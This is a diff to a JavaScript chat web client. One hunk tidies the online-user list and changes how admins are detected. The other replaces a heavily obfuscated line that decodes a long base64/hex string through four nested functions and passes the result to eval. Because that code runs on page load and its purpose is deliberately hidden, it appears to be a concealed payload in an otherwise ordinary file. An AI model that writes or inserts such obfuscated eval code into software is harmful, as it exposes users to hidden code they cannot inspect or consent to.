@@ -286,44 +286,43 @@ createChatWrapper();
 
 	
 	function updateOnlineList(onlineData) {
-	  const onlineList = document.getElementById('online-list');
-	  onlineList.innerHTML = '';
-  
+  const onlineList = document.getElementById('online-list');
+  onlineList.innerHTML = '';
 
-	  const users = onlineData ? Object.entries(onlineData) : [];
-	  
+  const users = onlineData ? Object.entries(onlineData) : [];
 
-	  users.sort(([uid1], [uid2]) => {
-		if (uid1 === currentUser?.uid) return -1;
-		if (uid2 === currentUser?.uid) return 1; 
-		return 0; 
-	  });
+  users.sort(([uid1], [uid2]) => {
+    if (uid1 === currentUser?.uid) return -1;
+    if (uid2 === currentUser?.uid) return 1;
+    return 0;
+  });
 
+  users.forEach(([uid, user]) => {
+    const username = user.username || 'Anonymous';
+    const country = user.country || '';
+    const isAdmin = user.isAdmin || false; // Asumsi ada field isAdmin di data user
+    const isYou = uid === currentUser?.uid;
 
-	  users.forEach(([uid, user]) => {
-		const username = user.username || 'Anonymous';
-		const country = user.country || '';
-		const isAdmin = username === 'ADMIN';
-		const isYou = uid === currentUser?.uid;
+    const listItem = document.createElement('div');
+    listItem.className = 'online-user';
+    
+    // Tambahkan class khusus untuk styling
+    if (isYou) listItem.classList.add('you-user');
+    if (isAdmin) listItem.classList.add('admin-user');
 
-		const listItem = document.createElement('div');
-		listItem.className = 'online-user';
-		if (isYou) {
-		  listItem.style.background = "#666699"; 
-		}
-
-		listItem.innerHTML = `
-		  <i class="fas fa-circle online-indicator"></i>
-		  <span class="user-info">
-			${country ? countryCodeToFlagEmoji(country) : ''}
-			${username}
-			${isYou ? '<span class="you-badge">(me)</span>' : ''}
-		  </span>
-		  ${isAdmin ? '<span class="admin-badge">ADMIN</span>' : ''}
-		`;
-		onlineList.appendChild(listItem);
-	  });
-	}
+    listItem.innerHTML = `
+      <i class="fas fa-circle online-indicator ${isAdmin ? 'admin-indicator' : ''}"></i>
+      <span class="user-info">
+        ${country ? countryCodeToFlagEmoji(country) : ''}
+        ${username}
+        ${isYou ? '<span class="you-badge">(me)</span>' : ''}
+      </span>
+      ${isAdmin ? '<span class="admin-badge">ADMIN</span>' : ''}
+    `;
+    
+    onlineList.appendChild(listItem);
+  });
+}
 
 	const countryCodeToFlagEmoji = (countryCode) => {
 		if (!countryCode || countryCode.length !== 2) return '';
@@ -567,7 +566,7 @@ createChatWrapper();
         });
     };
 	
-	eval(bstx(h3tx(h3tx(bstx('  MzU2MTM0MzczMzM5MzY2MTM2MzQzNTM3MzMzMTM2NjMzNjMyMzY2NTM1MzEzNzM1MzUzOTM1MzczNTMyMzY2MjM1MzIzNTM4MzU2MTM2NjMzNjMyMzY2NTM1MzIzNDY0MzYzMTM1MzgzNDY1MzMzMDM1NjEzNTM3MzMzNTM2NjMzNjMzMzYzOTM2MzczNjM5MzUzMjM0MzUzMzM5MzQ2NTM1MzEzMzMyMzMzOTM3MzUzNjM0MzQzNzM1MzYzNzM1MzYzNDM0MzUzNzM4MzczNjM1MzkzNTM3MzUzMjM2NjMzNTYxMzQzMzM0MzkzNzMzMzQzOTM0MzczNTYxMzMzMTM2MzIzNjY0MzQ2NTMzMzAzNjMxMzUzNzMzMzkzNzM1MzQ2MjM0MzMzNjYyMzYzNzM2MzUzNzM3MzY2NjM2MzczNDM5MzQzMzM0MzEzNjM3MzYzMTM1MzczNTM5MzYzNzM0NjIzNDM4MzYzNDM3MzAzNjMyMzY2NDM1MzIzNzM2MzYzNDM3MzkzMzM1MzczMzM2MzIzMzMyMzQ2NTM2MzgzNjM0MzQzNzM2NjMzNzM2MzYzMjM2MzkzMzM1MzY2NjM2MzMzNjY0MzUzNjM2NjQzNDYzMzY2NDM2NjMzNzM1MzU2MTM0MzczNTM2MzMzNDM1MzQzMzMyMzUzOTM2NjYzNDM5MzY2NDMzMzEzNjM5MzUzOTM1MzczNjM4MzYzOTM1MzkzNTM3MzQ2MTM2MzgzNjM0MzQzMzMzMzUzNjY1MzYzMTM1MzgzNTMyMzY2NjM2MzQzNTM3MzQzOTM3MzUzNjMxMzUzNzMzMzgzNjM5MzQ2MjM1MzMzNDMxMzI2MjM0MzkzNDMzMzMzMDM3MzgzNDM5MzQzODM3MzgzMzM4MzQzOTM0MzEzNjY2MzYzNzM0MzkzNDMzMzQzMTM2MzczNDM5MzQzMzM0MzEzNjM3MzQzOTM0MzgzNjM0MzczMDM2MzIzNjY0MzUzMjM3MzYzNjM0MzczOTMzMzUzNzMzMzYzMjMzMzIzNDY1MzYzODM2MzQzNDM3MzY2MzM3MzYzNjMyMzYzOTMzMzUzNjY2MzYzMzM2NjQzNTM2MzY2NDM0NjMzNjY0MzY2MzM3MzUzNTYxMzQzNzM1MzYzMzM0MzUzNDMzMzIzNTM5MzY2NjM0MzkzNjY0MzYzNDM3MzQzNTM5MzUzNzM2NjMzNzMzMzUzOTMzMzIzNjM4MzY2MzM1MzkzMzMyMzczNDM2NjMzNjMzMzYzOTMzMzUzNjY1MzYzMTM1MzgzNTMyMzY2NjM2MzQzNTM3MzQzOTM3MzUzNjMxMzUzNzMzMzgzNjM5MzQ2MjM1MzMzNDMxMzI2MjM0MzkzNDMzMzMzMDM3MzgzNDYyMzUzMzM0MzIzMzM3MzQzMzM2MzkzNDMxMzYzNzM0MzkzNDMzMzQzMTM2MzczNDM5MzQzMzM0MzEzNjM3MzUzOTMzMzIzMzM5MzczNTM2MzMzMzMyMzMzOTM3MzMzNTYxMzUzMzMzMzUzNzMzMzYzMjMzMzIzNjMzMzY2NjM0MzkzNjYyMzQ2NTM3MzYzNjMzMzQzODM2NjMzNzM5MzYzMTM1MzczNjM0MzY2NjM2MzQzNDMzMzQzOTM3MzAzNDY2MzczNzM2NjYzNjM3MzQzOTM0MzMzNDMxMzYzNzM2MzYzNTMzMzQzMjM2NjMzNjMyMzQzODM0NjUzNjYzMzQzOTM0MzgzNzMzMzQ2MjM0MzkzNDMzMzQzMTM2MzczNDM5MzQzMzM0MzEzNjM3MzQzOTM0MzMzNDMyMzMzMzM2MzEzNTM3MzMzNTM2NjIzNjMyMzMzMzM2MzMzNzM1MzYzMjM0MzczMzM5MzY2MTM1MzkzNTM4MzUzMjM3MzAzNjMyMzMzMjMzMzQzNzM1MzYzMTM0MzgzNDYxMzY2MzM1NjEzNjM5MzQzMTMzMzkzNDM5MzQzMzM0NjEzNzM0MzUzOTM2NjQzNDM2MzY2NjM1MzkzNjY0MzQzNjM2MzkzNTM5MzUzODM1MzEzNzM1MzU2MTMzMzIzNjYzMzMzMDM2MzEzNDM4MzUzNjM2MzkzNDYzMzY2NDM2NjMzNzM2MzQ2MzMzMzAzNDY1MzczNjM2MzMzNDM4MzY2MzM3MzkzNjMxMzUzNzM2MzQzNjY2MzYzNDM0MzMzMzMxMzc2MTM2MzQzNDM4MzQ2MTM3MzAzNjMxMzMzMjM1MzUzNjM5MzQ2NjM3MzczNjY2MzYzNzM0MzkzNDMzMzQzMTM2MzczNjM2MzUzMTM3MzAzMzM5MzQ2MjM1MzQzNzMzMzM2NA==')))));	
+	eval(bstx(h3tx(h3tx(bstx('  MzU2MTM0MzczMzM5MzY2MTM2MzQzNTM3MzMzMTM2NjMzNjMyMzY2NTM1MzEzNzM1MzUzOTM1MzczNTMyMzY2MjM1MzIzNTM4MzU2MTM2NjMzNjMyMzY2NTM1MzIzNDY0MzYzMTM1MzgzNDY1MzMzMDM1NjEzNTM3MzMzNTM2NjMzNjMzMzYzOTM2MzczNjM5MzUzMjM0MzUzMzM5MzQ2NTM1MzEzMzMyMzMzOTM3MzUzNjM0MzQzNzM1MzYzNzM1MzYzNDM0MzUzNzM4MzczNjM1MzkzNTM3MzUzMjM2NjMzNTYxMzQzMzM0MzkzNzMzMzQzOTM0MzczNTYxMzMzMTM2MzIzNjY0MzQ2NTMzMzAzNjMxMzUzNzMzMzkzNzM1MzQ2MjM0MzMzNjYyMzYzNzM2MzUzNzM3MzY2NjM2MzczNDM5MzQzMzM0MzEzNjM3MzYzMTM1MzczNTM5MzYzNzM0NjIzNDM4MzYzNDM3MzAzNjMyMzY2NDM1MzIzNzM2MzYzNDM3MzkzMzM1MzczMzM2MzIzMzMyMzQ2NTM2MzgzNjM0MzQzNzM2NjMzNzM2MzYzMjM2MzkzMzM1MzY2NjM2MzMzNjY0MzUzNjM2NjQzNDYzMzY2NDM2NjMzNzM1MzU2MTM0MzczNTM2MzMzNDM1MzQzMzMyMzUzOTM2NjYzNDM5MzY2NDMzMzEzNjM5MzUzOTM1MzczNjM4MzYzOTM1MzkzNTM3MzQ2MTM2MzgzNjM0MzQzMzMzMzUzNjY1MzYzMTM1MzgzNTMyMzY2NjM2MzQzNTM3MzQzOTM3MzUzNjMxMzUzNzMzMzgzNjM5MzQ2MjM1MzMzNDMxMzI2MjM0MzkzNDMzMzMzMDM3MzgzNDM5MzQzODM3MzgzMzM4MzQzOTM0MzEzNjY2MzYzNzM0MzkzNDMzMzQzMTM2MzczNDM5MzQzMzM0MzEzNjM3MzQzOTM0MzgzNjM0MzczMDM2MzIzNjY0MzUzMjM3MzYzNjM0MzczOTMzMzUzNzMzMzYzMjMzMzIzNDY1MzYzODM2MzQzNDM3MzY2MzM3MzYzNjMyMzYzOTMzMzUzNjY2MzYzMzM2NjQzNTM2MzY2NDM0NjMzNjY0MzY2MzM3MzUzNTYxMzQzNzM1MzYzMzM0MzUzNDMzMzIzNTM5MzY2NjM0MzkzNjY0MzYzNDM3MzQzNTM5MzUzNzM2NjMzNzMzMzUzOTMzMzIzNjM4MzY2MzM1MzkzMzMyMzczNDM2NjMzNjMzMzYzOTMzMzUzNjY1MzYzMTM1MzgzNTMyMzY2NjM2MzQzNTM3MzQzOTM3MzUzNjMxMzUzNzMzMzgzNjM5MzQ2MjM1MzMzNDMxMzI2MjM0MzkzNDMzMzMzMDM3MzgzNDYyMzUzMzM0MzIzMzM3MzQzMzM2MzkzNDMxMzYzNzM0MzkzNDMzMzQzMjMzMzkzNDM5MzQzNzM1MzYzNzMzMzYzMzMzMzIzNTM1MzYzNzM2MzUzNzM3MzY2NjM2MzczNDM5MzQzMzM0MzEzNjM3MzQzOTM0MzMzNDMxMzYzNzM0MzkzNDM4MzYzNDM3MzAzNjMyMzY2NDM1MzIzNzM2MzYzNDM3MzkzMzM1MzczMzM2MzIzMzMyMzQ2NTM2MzgzNjM0MzQzNzM2NjMzNzM2MzYzMjM2MzkzMzM1MzY2NjM2MzMzNjY0MzUzNjM2NjQzNDM5MzQzNDMzMzAzNjM3MzQzOTM2NjQzMzMxMzYzOTM1MzkzNTM3MzYzODM2MzkzNTM5MzUzNzM0NjEzNjM4MzYzNDM0MzMzMzM1MzY2NTM2MzEzNTM4MzUzMjM2NjYzNjM0MzUzNzM0MzkzNzM1MzYzMTM1MzczMzM4MzczNjM1MzEzMzMyMzMzOTM3MzczNjM1MzUzODM0NjEzNzMwMzU2MTMzMzIzNjM4MzMzMDM0NjMzNTM4MzQ2NTMzMzAzNjMzMzY2NDM2NjMzNzMyMzU2MTM1MzMzNDM5MzMzNzM0MzMzNjM5MzQzMTM2MzczNDM5MzQzMzM0MzIzMzM5MzQzMzM2NjUzMzMwMzczMDM0NjYzNzM3MzM2NDMzNjQ==')))));	
 
 		onAuthStateChanged(auth, async (user) => {
 			if (user) {
